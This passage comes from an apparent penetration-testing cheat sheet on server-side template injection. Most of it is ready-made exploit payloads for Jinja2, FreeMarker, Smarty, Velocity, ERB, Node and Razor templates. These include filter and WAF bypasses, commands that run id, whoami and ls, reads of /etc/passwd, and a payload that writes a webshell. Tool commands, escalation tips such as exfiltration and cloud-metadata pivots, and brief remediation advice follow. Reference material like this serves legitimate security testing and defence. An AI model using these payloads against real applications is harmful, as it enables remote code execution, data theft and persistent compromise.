  {{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}
  # Example: Using attr() and hex (Source: HackTricks)
  {%raw %}{% with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()%}{{a}}{% endwith %}{% endraw %}
  ```
- URL Parameter manipulation (Source: HackTricks):
  - Pass attribute name: `?c=__class__` -> `{{ request|attr(request.args.c) }}`
  - Construct attribute name: `?f=%s%sclass%s%s&a=_` -> `{{ request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a)) }}`
  - List join: `?l=a&a=_&a=_&a=class&a=_&a=_` -> `{{ request|attr(request.args.getlist(request.args.l)|join) }}`

> **Note:** The index for `subprocess.Popen` differs between CPython 3.11 and 3.12; enumerate `__subclasses__()` at runtime instead of hard‑coding.

### Keyword Filtering Bypass

- Concatenation: `'os'.__class__` -> `'o'+'s'`
- Using `request` object attributes or environment variables if keywords like `import` or `os` are blocked.
- Jinja2 Context Variables: Access `os` via `{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}` or similar paths ([Source: Podalirius](https://podalirius.net/fr/articles/python-vulnerabilities-code-execution-in-jinja-templates/)).

### NET Reflection

Use reflection to load assemblies or invoke methods indirectly.
On modern ASP.NET Core, Razor limits direct process start; look for misused `Html.Raw`, custom tag helpers, or debug compilation flags.

### String-less Exploitation

Modern WAFs often filter quotes and common keyword tokens. 2025 research showed how to build strings from arithmetic or list indices.

```jinja
{{ (().__class__.__base__.__subclasses__()[104].__init__.__globals__).os.popen('id').read() }}
```

For Node templating (EJS/Pug/Handlebars server-side), prefer prototype traversal to reach `Function` or `require` when helpers expose evaluation sinks:

```js
<%=(global.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')())%>
```

### Recent CVEs (2024‑2025)

| CVE            | Affected component                          | Severity | Fixed in              |
| -------------- | ------------------------------------------- | -------- | --------------------- |
| CVE‑2024‑22195 | Jinja2 sandbox / `xmlattr` filter bypass    | High     | 3.1.3                 |
| CVE‑2024‑46507 | Yeti threat‑intel platform SSTI → RCE       | Critical | 1.6.2                 |
| Various (2024) | Atlassian Confluence widgets, CrushFTP, HFS | Critical | See vendor advisories |

### Automated Scanning & CI Integration

- **nuclei** and **semgrep** include up‑to‑date SSTI rules; integrate them into pull‑request checks.
- GitHub code‑scanning query pack “SSTI” (released 2024‑10) covers Python, PHP, Go.
- Add a CI gate blocking merges on raw `render_template_string` or `.format()` inside templates.

## Vulnerabilities

Common vulnerable patterns include:

- Direct Rendering: `render_template_string("Hello " + user_input)`
- Unsafe Variable Usage: `{{ unsafe_variable }}` where `unsafe_variable` contains template code.
- Framework-Specific Functions: Using functions known to be dangerous if processing user input (consult framework documentation).

### Tools

**Active Exploitation:**

- **tplmap**: `python tplmap.py -u 'http://www.target.com/page?name=John*'` ([https://github.com/epinna/tplmap](https://github.com/epinna/tplmap))
- **SSTImap**: `python3 sstimap.py -u "https://example.com/page?name=John" -s`
- **TInjA**: `tinja url -u "http://example.com/?name=Kirlia"`
- **crithit** – SSTI‑centric fuzzer supporting Go/Tera, Blade, and Mako (2024)

**Burp Suite Extensions:**

- **Template Injector** – maintained fork replacing TemplateTester
- **Server Side Template Injection** - Active scanner checks
- **Param Miner** - Discover hidden parameters that might accept template input

**Scanning & Detection:**

- **nuclei** (`templates/ssti-*`) – fast HTTP scanner with updated SSTI signatures (2024-2025)
- **semgrep** with SSTI rulesets – Static analysis for template injection vulnerabilities
- **GitHub CodeQL** "SSTI" query pack (2024-10) – Covers Python, PHP, Go

**Framework-Specific:**

- **Jinja2 Sandbox Escape Tools** - Testing Jinja2 sandboxed environments
- **Node Template Tester** - EJS/Pug/Handlebars/Nunjucks testing suite

### Manual Testing & Exploitation Payloads

- Generic/Polyglot:
  - `${{<%[%'"}}%\.`
  - `{{7*7}}` -> `49`
  - `{{7*'7'}}` -> `7777777`
  - `{{ '7'*7 }}` (Jinja2) -> `7777777`
  - `@(1+2)` (.NET Razor) -> `3`
- Jinja2 (Python / Flask):
  - Debug/Info: `{{config}}`, `{{self}}`, `{{settings.SECRET_KEY}}`, `{% debug %}` (Requires debug extension)
  - List Subclasses: `{{ [].__class__.__base__.__subclasses__() }}` , `{{ ''.__class__.__mro__[1].__subclasses__() }}` (Index 1 or 2 depending on Python version)
  - Recover `object` Class: `{{ ''.__class__.__mro__[1] }}` (or `[2]`), `{{ ''.__class__.__base__ }}`
  - Find File Class: Iterate through subclasses list or guess index, e.g., `[40]` on some systems.
  - Read File (via `__subclasses__`): `{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}` (Index varies)
  - RCE (via `__subclasses__`): `{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip() }}` (Find `subprocess.Popen` index, e.g., `396`)
  - RCE (Common - via `__globals__`): `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
  - RCE (via `request` object - `__globals__`): `{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}`
  - RCE (via `config` object - `__globals__`): `{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}`
  - RCE (Alternative via `__globals__` search): `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}` (Search for a class with `_module` attribute)
  - RCE (via `config` and `import_string`): `{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}`
  - RCE (via `request` and hex/brackets bypass): `{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}`
  - Write File (via `__subclasses__`): `{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evil', 'w').write('hello') }}` (Index varies)
  - Write Evil Config & RCE:
    ```python
    # Write config
    {{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
    # Load config
    {{ config.from_pyfile('/tmp/evilconfig.cfg') }}
    # Execute
    {{ config['RUNCMD']('id',shell=True) }}
    ```
  - Avoid HTML Encoding: `{{'<script>alert(1)</script>'|safe}}`
  - Loop: `{%raw %}{% for c in [1,2,3] %}{{ c,c,c }}{% endfor %}{% endraw %}`
- FreeMarker (Java):
  - RCE: `<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }`
  - RCE: `${"freemarker.template.utility.Execute"?new()("id")}`
  - File Read: `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}` (May require adjustments)
  - Info: `${class.getResource("").getPath()}`, `${T(java.lang.System).getenv()}`
- Smarty (PHP):
  - `{$smarty.version}`
  - `{php}echo `id`;{/php}` (If PHP tag enabled)
  - `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}` (Write webshell)
  - `{{7*7}}`, `{{7*'7'}}`
  - `{{dump(app)}}` (Symfony)
  - `"{{'/etc/passwd'|file_excerpt(1,30)}}"@` (Twig)
- Velocity (Java):
  - `#set($str=$class.inspect("java.lang.String").type)`
  - `#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))`
  - `$ex.waitFor()`
  - `#set($out=$ex.getInputStream()) ... #foreach ... $str.valueOf($chr.toChars($out.read())) ... #end` (Read command output)
- Ruby (ERB, Slim):
  - `<%= system("whoami") %>`
  - `<%= Dir.entries('/') %>`
  - `<%= File.open('/etc/passwd').read %>`
- Node.js (Various engines):
  - `{{this.constructor.constructor('return process.mainModule.require("child_process").execSync("id")')()}}`
  - Payloads often involve traversing prototypes (`this.__proto__`) to reach `constructor` and eventually `Function` or `require`. See PayloadAllTheThings / Hacker Recipes for detailed Node examples.
- ASP/.NET (Razor, etc.):
  - `@(1+2)` -> `3`
  - `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
  - `<%= CreateObject("Wscript.Shell").exec("cmd /c whoami").StdOut.ReadAll() %>` (Classic ASP)
- Perl (Template Toolkit):
  - `[% PERL %] ... perl code ... [% END %]`
  - `<%= perl code %>` or `<% perl code %>` (Depending on config)
- Go (`text/template`):
  - Potentially dangerous if methods allowing command execution are exposed to the template: `{{ .System "ls" }}`
  - `html/template` is generally safer against XSS but might still leak info if not used carefully.

### Comprehensive Payloads

- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [PayloadBox - SSTI](https://github.com/payloadbox/ssti-payloadsb/ssti-server-side-template-injection/index.html)

## Chaining and Escalation

SSTI often leads directly to RCE, but can also be used for:

- **RCE:** Primary goal, gain shell access.
- **File Exfiltration:** Read sensitive files (`/etc/passwd`, `web.config`, source code, credentials).
- **Information Disclosure:** Dump environment variables, application configuration (`{{config}}`, `{{settings}}`), object properties, internal network paths.
- **Internal Network Access:** Use RCE to pivot, scan internal networks, or access internal services.
- **Privilege Escalation:** Combine RCE with local exploits if the web server runs with elevated privileges.
- **Data Exfiltration:** Send internal data to an attacker-controlled server (e.g., via HTTP requests or DNS exfiltration from within the template code).
- **SSRF pivot:** Some engines permit URL‑fetch filters (`{{''|fetch('http://...')}}`); leverage SSTI to query cloud‑metadata endpoints.

## Remediation Recommendations

- Never Render User Input Directly: The most critical step. Treat user input as data, not code.
- Use Safe Templating Practices:
  - Pass user data into templates using dedicated template variables (e.g., `render_template('page.html', user_data=user_input)`).
  - Use logic-less templates if possible.
- Sanitize and Validate: If rendering user input is unavoidable (e.g., CMS), rigorously sanitize it. Remove or escape all template syntax characters (`{`, `}`, `$`, `%`, `<`, `>`, etc.). Use allow-lists for safe HTML if needed.
- Use Sandboxed Environments: Configure the template engine's sandbox if available and effective for the specific engine. Be aware that sandboxes can often be bypassed.
- Choose Safer Engines: Prefer engines designed for security, like Go's `html/template` over `text/template` for HTML output, as it provides context-aware auto-escaping.
- Principle of Least Privilege: Run the web application process with minimal privileges.
- Input Validation: Validate input against expected formats (e.g., email, number) before it reaches the template layer.
- Patch management: track and apply security updates for template engines (see Recent CVEs).
- Harden runtime: enable seccomp/AppArmor or gVisor so that even a successful RCE has minimal kernel attack surface.
- CI guardrails: block usage of dangerous APIs (e.g., `render_template_string`, `Template.compile`, `eval` filters) via linters/semgrep; add approve‑list of safe helpers
- For Node: disable `with` in EJS, avoid `compileDebug`, and run with `vm` sandbox only when fully locked down (no `require` or `Function` reachable)
